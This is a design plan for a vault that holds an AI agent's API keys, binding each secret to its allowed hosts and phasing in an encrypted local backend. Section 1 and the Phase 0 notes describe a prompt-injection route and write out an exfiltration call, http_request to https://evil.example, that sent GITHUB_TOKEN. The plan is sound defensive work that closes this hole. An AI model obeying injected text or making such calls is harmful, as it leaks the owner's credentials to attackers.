# Vault plan

A secret store for the brain's API keys, built in Rust in this codebase,
pluggable by configuration (local first; AWS, GCP or HashiCorp later), on one
rule the owner set: **the brain may use a secret to reach a service, never
create, read back or keep one.** Planned 2026-10-20 from todo f64c06ee and the
2026-09-11 design conversation (nothing built then; the dead
`services/secrets/` module, with its broken SipHash KDF, has since been
deleted).

## 1. Why

- **Keys are about to be the brain's job to hold.** api-scout finds APIs and
  the chat registers them end to end (OpenViglet, 2026-10-16, was keyless).
  Getting a key stays the owner's job; storing it is the brain's, and today
  that means hand-editing `.env` and restarting.
- **22 secrets sit in one plaintext file.** `.env` (gitignored) holds every
  key next to plain config, readable by anything that reads the repo
  directory.
- **A model can aim any secret at any public host (found 2026-10-20).**
  `define_api_context` stores whatever `auth_env_var` the model passes, and
  `http_request` then sends that variable's value to the context's
  `base_url` (`crates/retrieve/src/http.rs`, auth injection). Nothing ties a
  key to the service it belongs to, so a prompt injected into a page could
  register `https://evil.example` with `auth_env_var: ANTHROPIC_API_KEY` (or
  `NEO4J_PASSWORD`) and have the brain send it there. The net policy does not
  help: the host is public. This is Phase 0, before any vault exists.

## 2. What is there today (measured 2026-10-20)

**The indirection is right; keep it.** `:ApiContext.auth_env_var`,
`:McpServer.auth_env_var`, search-engine and page-reader `key_env`, and
provider `api_key_env` store only the *name* of a secret, resolved at call
time. The model can read and write those nodes and never sees a value. The
vault swaps what the name resolves through; nothing above it changes.

Resolution points (each reads the process environment):

| Where | Reads | When |
|---|---|---|
| `retrieve/src/http.rs` | `ApiContext.auth_env_var` | each `http_request` / `ingest_api` call |
| `work/src/mcp_client.rs` | `McpServer.auth_env_var` | each MCP call |
| `retrieve/src/search_engines.rs` | an engine's key name | each search |
| `retrieve/src/page_readers.rs` | a reader's key name | each page read |
| `llm/src/provider_registry.rs` | `api_key_env` | building an `LlmConfig` (startup and per route) |
| `host/src/plugins.rs` `PluginContext::env` | any name a plugin asks for | plugin start and calls |

Secrets in `.env` (22): AIDEVEBOARD_KEY, ANAKINIO_API_KEY, ANTHROPIC_API_KEY,
BRAVE_API_KEY, CURRENTS_API_KEY, EXA_API_KEY, GEMINI_API_KEY, GITHUB_TOKEN,
HOME_ASSISTANT_TOKEN, LIGHTNING_API_KEY, MCP_API_KEY, MISTRAL_API_KEY,
NEO4J_PASSWORD, OLLAMA_API_KEY, OPENROUTER_API_KEY, PARALLEL_API_KEY,
SERPAPI_KEY, SERPER_API_KEY, TAVILY_API_KEY, TINYFISH_API_KEY, WEBZIO_API_KEY,
YOUTUBE_API_KEY.

`MCP_API_KEY` is blank in compose, so the HTTP API is unauthenticated on the
LAN. Any vault route added to it is reachable by anything on the network
until that changes (§7, decision 3).

## 3. Shape

### One resolver, pluggable backends

A `secrets` module low in the stack (in `protocol`, or a new crate under
`llm`, so `retrieve`, `work`, `llm` and `host` can all reach it):

```rust
/// A secret value: no Debug/Display, zeroized on drop.
pub struct SecretString(/* zeroize::Zeroizing<String> */);

pub trait SecretSource: Send + Sync {
    /// The value of `name`, if this source holds it.
    async fn get(&self, name: &str) -> Result<Option<SecretString>, SecretError>;
    /// Names it holds, with metadata. Never values.
    async fn list(&self) -> Result<Vec<SecretMeta>, SecretError>;
}

/// The only way to a value: the index decides whether `name` may go to `host`,
/// then the ladder resolves it (vault, then env, then unconfigured).
pub async fn resolve(name: &str, host: &str) -> Result<SecretString, Refusal>;
```

- `VAULT_BACKEND` picks the source: `env` (today's behaviour, the default
  until Phase 2 ships), `age` (local, §4), later `aws`, `gcp`, `hashicorp`.
  Each is a type behind `SecretSource` and nothing else changes, which is the
  owner's "move vaults at the configuration level".
- **The ladder is vault, then env, then unconfigured**, so keys move one at a
  time and nothing breaks halfway.
- **Read-only on purpose.** The trait has no `put`. The brain's binary has no
  tool, route or code path that writes a secret.
- **Decrypt per call, not at boot.** It shortens the plaintext lifetime a
  little (the identity is in memory regardless) and gives last-used tracking
  for free.

### The index binds a secret to its hosts

Every secret has an entry: name, description, **the hosts it may be sent
to**, created/rotated dates. No values. `resolve` refuses a name with no entry
and a host the entry does not list, with a reason that says which. A model
can still define an API context, but it can point it only at a secret whose
entry already lists that context's host, and only the owner edits the index.
That closes the §1 hole, and it is the same check whichever backend holds
the values.

### The write side is a separate tool that cannot read

`agent-brain-vault` (a small separate binary, or a CLI subcommand outside the
server path): `add <name> --host <h>... [--description]` reads the value from
stdin (never argv: shell history), `rotate`, `remove`, `list`, `hosts`. For
the `age` backend it holds **only the public recipient key**, so it can
encrypt a new secret and can never decrypt an old one. That is the structural
answer to "the brain should not encrypt": the brain holds the identity and has
no write path; the writer holds only the public key. A property of the maths,
not of a trait boundary that a later refactor can erode.

## 4. The local backend: age

`age` (the `age` crate, the format `rage` implements). Asymmetric: encrypting
needs the public recipient, decrypting the private identity.

```
$VAULT_DIR/                 (default ~/.config/agent-brain/vault, mounted :ro)
  identity.age              X25519 identity, itself protected (root key, below)
  recipients.txt            public key(s); safe to commit
  index.yaml                names, hosts, dates, descriptions; no values
  secrets/<name>.age        one file per secret
```

Per-secret files, a shape borrowed from `pass` (the owner's own `pass` store
stays his and is not used: decided 2026-09-11).

**The root key.** One plaintext root secret cannot be eliminated, only
reduced from 22 to 1 and handled deliberately. Options, ranked:

1. **Key file**, `0400`, mounted read-only into the container. Unattended
   restarts work. Recommended default.
2. **Passphrase at unlock.** Nothing at rest; every restart waits for the
   owner (§7, decision 2).
3. **TPM via `systemd-creds`** on the Debian host: unattended and protected
   at rest. Builds on option 1 with no code change (systemd decrypts the key
   file into a tmpfs the container mounts).
4. YubiKey: unusable for a 3 a.m. restart. Out.

## 5. What moves, in tiers

- **Tier 1, call-time keys (Phase 2).** Everything resolved per call: SerpApi,
  Serper, Brave, Exa, Tavily, TinyFish, Anakin, Currents, Webz, GitHub, Home
  Assistant, AI Dev Board, YouTube, Parallel. No startup coupling, and they
  hold all the quota and money. No lock-state machinery needed.
- **Tier 2, LLM provider keys (Phase 4).** Ollama, Gemini, Anthropic, Mistral,
  OpenRouter. Read when an `LlmConfig` is built, so a locked vault means no
  cloud generation. Arguably right: a locked brain runs local llama.cpp work,
  serves the graph, and defers cloud jobs (the queue already defers work
  with no eligible rung). Needs the locked state to be visible (§7, decision 2).
- **Tier 3, cannot move.** `NEO4J_PASSWORD` (Neo4j needs it before the brain
  starts), `MCP_API_KEY` (it authenticates the request that would unlock the
  vault: inside the vault it could never be used to unlock), and
  `LIGHTNING_API_KEY` (only the fine-tuning scripts on the host use it; the
  brain never reads it). They stay in
  `.env`.

## 6. Phases

Each phase is shippable and leaves the brain working.

**Phase 0: bind secrets to hosts (no vault). Built 2026-10-21.** What
shipped, and where it differs from the sketch below:

- `agent_brain_protocol::secrets::resolve(name, url)` with the index at
  `SECRETS_INDEX` (`$VAULT_HOST_DIR/index.yaml` on the host, mounted
  read-only; outside the repo because the brain mounts the repo read-write).
  Bootstrapped from the graph's nine keyed bindings; shape in
  `project-docs/secrets-index.example.yaml`. A missing index refuses all.
- **Gated: the two graph-sourced points only**, `http_request`/`ingest_api`
  (`:ApiContext`) and `mcp_call` (`:McpServer`). The other four read a key
  name and host from files only the owner enables (search engines, page
  readers, `models.yaml` providers, plugin code), so a model cannot aim them;
  they move to `resolve` with the vault backend in Phase 2.
- **Worse than §1 said:** `http_request` used an absolute `url` as-is even
  with a `context_name`, so no new context was needed:
  `http_request(url: "https://evil.example", context_name: "github")` sent
  `GITHUB_TOKEN`. The check judges the URL actually requested.
- **And redirects:** reqwest drops `Authorization` on a cross-host redirect
  but keeps a custom header (`X-API-Key`). A keyed request now uses
  `net_policy::guard_pinned`: a redirect off the first request's origin is
  not followed and the 3xx comes back.
- `define_api_context` stores the context either way and says `key_not_sent`
  with the reason when its key is not bound to its host.

The original sketch: the resolver with only the
`env` backend, and the index. All six resolution points call
`resolve(name, host)`. Seeded and owner-made contexts get index entries with
their current hosts; a context whose `auth_env_var` has no entry for its host
is refused with the reason, and `define_api_context` says at write time that
the key will not be sent until the owner binds it. Tests: a model-defined
context naming `ANTHROPIC_API_KEY` on a new host gets no key; every existing
workflow's call still authenticates (live check over a day of runs).
*Closes the §1 hole on its own.*

**Phase 1: `SecretString` everywhere.** Values travel as `SecretString` from
`resolve` to the header builder: no `Debug`, no `Display`, zeroized on drop.
The realistic leak is `tracing::debug!("{:?}", config)`, not memory
scraping; a test asserts a config's `Debug` output holds no key.

**Phase 2: the `age` backend and the writer.** `VAULT_BACKEND=age`,
`$VAULT_DIR` mounted read-only, the identity from a key file.
`agent-brain-vault add/rotate/remove/list/hosts`. Move Tier 1 one key at a
time; each moved key is deleted from `.env`, and the ladder means a missed one
still works from env, with a warning naming it.

**Phase 3: status in the HBI and the brain.** `GET /api/vault`: backend,
locked or unlocked, names with hosts and last used, no values ever. System
panel row; `list_capabilities` says which engines and APIs are unconfigured
because their secret is missing (the search ladder stops burning a rung on an
engine with no key). An item like "get a key for X" names the CLI command
the owner runs; the brain learns only the name.

**Phase 4: Tier 2 and the locked brain.** Provider keys move; a locked brain
boots, runs local work, defers cloud work, and shows 🔒 with the reason.
Unlock as decided in §7.

**Phase 5: other backends, when wanted.** `aws` (Secrets Manager), `gcp`
(Secret Manager), `hashicorp` (KV v2), each a `SecretSource` behind
`VAULT_BACKEND`, the index unchanged. Built only when a deployment needs one:
an interface with no caller is dead code (CORE_AND_PLUGINS_PLAN Phase 0).

## 7. Decisions for the owner

Recommendations first; each is the owner's call.

1. **Does the HBI write secrets?** Recommend **no**: status and hosts only,
   writes by the CLI on the host. A browser form on an unauthenticated LAN API
   is the weakest point of the whole design, and the "brain never creates a
   secret" rule is easiest to keep when no brain route can.
2. **Locked-brain behaviour.** Recommend the **key file by default**
   (unattended restarts), so the brain is locked only when the key file is
   missing. Then it boots degraded (local only, cloud deferred) and says so,
   rather than refusing to start.
3. **Authenticating unlock while `MCP_API_KEY` is empty.** Recommend **no
   unlock route at all** with the key file (nothing to unlock over HTTP). If
   the passphrase option is chosen: a separate unlock token, and the route
   bound to localhost only, never on the LAN API. Separately: turn
   `MCP_API_KEY` on before Phase 3 exposes `/api/vault`, even read-only.
4. **How a key reaches the vault.** Recommend: the item that asks for a key
   names the exact command (`agent-brain-vault add SERPER_API_KEY --host
   google.serper.dev`); the owner runs it; the brain sees the name appear in
   `/api/vault` and the item closes. The brain never handles the value.
5. **Index location.** Recommend `$VAULT_DIR/index.yaml`, outside the repo:
   hosts include tailnet names, which stay out of committed files. A committed
   example (`project-docs/vault-index.example.yaml`) shows the shape.
6. **Phase 0 now, separately?** Recommend **yes, first and on its own**: it
   closes a live hole in a day or two of work and needs no vault.

## 8. Limits, said plainly

- Nothing here defends against code execution as the owner's user while the
  brain runs: the identity is in process memory either way.
- The key file is the one plaintext secret. TPM (option 3) protects it at
  rest; nothing protects it from root on the host.
- The index stops a model sending a key to a host it was not bound to. It
  does not stop a bound host from misusing the key it legitimately receives.
